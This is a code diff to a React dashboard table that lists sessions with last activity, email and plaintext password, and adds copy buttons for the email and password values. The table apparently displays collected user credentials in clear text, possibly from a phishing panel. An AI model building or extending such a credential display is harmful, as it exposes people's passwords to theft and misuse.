@@ -521,9 +521,11 @@ export default function Dashboard() {
                         <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                           {formatTime(s.lastActivity)}
                         </td>
-                        <td className="break-all px-4 py-3 font-mono text-xs">{s.email}</td>
                         <td className="break-all px-4 py-3 font-mono text-xs">
-                          {hasPassword ? s.password : <span className="text-muted-foreground">—</span>}
+                          <CopyText value={s.email} />
+                        </td>
+                        <td className="break-all px-4 py-3 font-mono text-xs">
+                          <CopyText value={hasPassword ? s.password : ""} />
                         </td>
                         <td className="whitespace-nowrap px-4 py-3 text-xs">
                           <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
